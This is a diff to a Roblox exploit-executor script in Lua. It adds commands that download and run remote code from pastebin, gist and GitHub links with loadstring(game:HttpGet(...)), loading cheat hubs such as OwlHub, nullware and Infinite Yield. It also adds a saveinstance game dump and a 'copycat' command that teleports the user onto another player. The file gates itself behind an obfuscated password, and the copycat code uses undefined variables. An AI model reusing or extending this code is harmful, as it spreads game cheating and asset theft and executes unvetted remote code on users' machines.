@@ -10,7 +10,7 @@ local Player = game.Players.LocalPlayer
 local password = "k" ..                                                                                                                  "e" ..                                              "k"
 local passed = false
 local intweeninfo,outtweeninfo = TweenInfo.new(0.4,Enum.EasingStyle.Quad,Enum.EasingDirection.In),TweenInfo.new(0.4,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
-local commands = {"fps","antilog","boombox","hydroxide","iy","dex","serverhop","serverhop2","rejoin"}
+local commands = {"fps","antilog","boombox","hydroxide","iy","dex","serverhop","serverhop2","rejoin","nullware","owlhub","removekorblox","saveinstance","copycat"}
 local executor
 
 --= GUI =--
@@ -292,32 +292,66 @@ local function tweencommands(bool)
 end
 
 local function command(cmd)
-	if string.lower(cmd) == "fps" then
+	local cmd2 = cmd:split(" ")
+	if string.lower(cmd2[1]) == "fps" then
 		loadstring(game:HttpGet('https://gist.githubusercontent.com/CenteredSniper/b84117b57dd254912c4ae6f93cff5fba/raw/cfa3a426366d767c1729c1a92411eeb22d1eca5e/gistfile1.txt'))();
-	elseif string.lower(cmd) == "hydroxide" then
+	elseif string.lower(cmd2[1]) == "hydroxide" then
 		local function webImport(file)
 			return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format("Upbolt", "revision", file)), file .. '.lua')()
 		end
 		webImport("init")
 		webImport("ui/main")
-	elseif string.lower(cmd) == "antilog" then
+	elseif string.lower(cmd2[1]) == "antilog" then
 		loadstring(game:HttpGet('https://pastebin.com/raw/444k40vk'))();
-	elseif string.lower(cmd) == "boombox" then
+	elseif string.lower(cmd2[1]) == "saveinstance" then
+		local bool = false
+		if string.lower(cmd2[2]) == "yes" or string.lower(cmd2[2]) == "true" then bool = true end
+		saveinstance{noscripts = bool, mode = "optimized"}
+	elseif string.lower(cmd2[1]) == "removekorblox" then
+		local LP = game.Players.LocalPlayer
+		local a = LP.Character:FindFirstChild("Korblox Deathspeaker Right Leg")
+		if a then a:Destroy() end
+		LP.CharacterAdded:Connect(function(v)
+ 			repeat wait() until v:FindFirstChild("Korblox Deathspeaker Right Leg")
+				v:WaitForChild("Korblox Deathspeaker Right Leg"):Destroy()
+		end)
+	elseif string.lower(cmd2[1]) == "copycat" then
+		if _G.FunyEpic then _G.FunyEpic:Disconnect() end
+		if cmd2[2] then
+			local copyplr
+			for _, v in pairs(game.Players:GetPlayers()) do
+				if cmd2[2]:lower() == (v.Name:lower()):sub(1, #cmd2[2]) then
+					copyplr = v
+				end
+			end
+			if copyplr then
+				_G.FunyEpic = game:GetService("RunService").Heartbeat:Connect(function()
+    					local pos = plr.Character.HumanoidRootPart.CFrame
+					wait(tonumber(cmd2[3]) or 0)
+    					lplr.Character.HumanoidRootPart.CFrame = pos
+				end)
+			end
+		end
+	elseif string.lower(cmd2[1]) == "owlhub" then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/ZinityDrops/OwlHubLink/master/OwlHubBack.lua"))();
+	elseif string.lower(cmd2[1]) == "boombox" then
 		loadstring(game:HttpGetAsync('https://riptxde.dev/u/BoomboxHubV3.lua'))()
-	elseif string.lower(cmd) == "iy" then
+	elseif string.lower(cmd2[1]) == "iy" then
 		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-	elseif string.lower(cmd) == "dex" then
+	elseif string.lower(cmd2[1]) == "dex" then
 		loadstring(game:HttpGetAsync("https://pastebin.com/raw/fPP8bZ8Z"))()
-	elseif string.lower(cmd) == "serverhop" then
+	elseif string.lower(cmd2[1]) == "nullware" then 
+		loadstring(game:HttpGet("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/37eef2120d509b37b31fa73944ab2361/raw/kT2fVEFnzDfCRXAP"))()
+	elseif string.lower(cmd2[1]) == "serverhop" then
 		local sl = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/".. game.PlaceId.. "/servers/Public?sortOrder=Asc&limit=100"))
 		for i,v in pairs(sl.data) do
 			if v.playing ~= v.maxPlayers then
 				game:service'TeleportService':TeleportToPlaceInstance(game.PlaceId, v.id)
 			end
 		end
-	elseif string.lower(cmd) == "serverhop2" then
+	elseif string.lower(cmd2[1]) == "serverhop2" then
 		game:GetService('TeleportService'):Teleport(game.PlaceId, game.Players.LocalPlayer)
-	elseif string.lower(cmd) == "rejoin" then
+	elseif string.lower(cmd2[1]) == "rejoin" then
 		if #game.Players:GetPlayers() <= 1 then
 			wait()
 			game:GetService('TeleportService'):Teleport(game.PlaceId, game.Players.LocalPlayer)
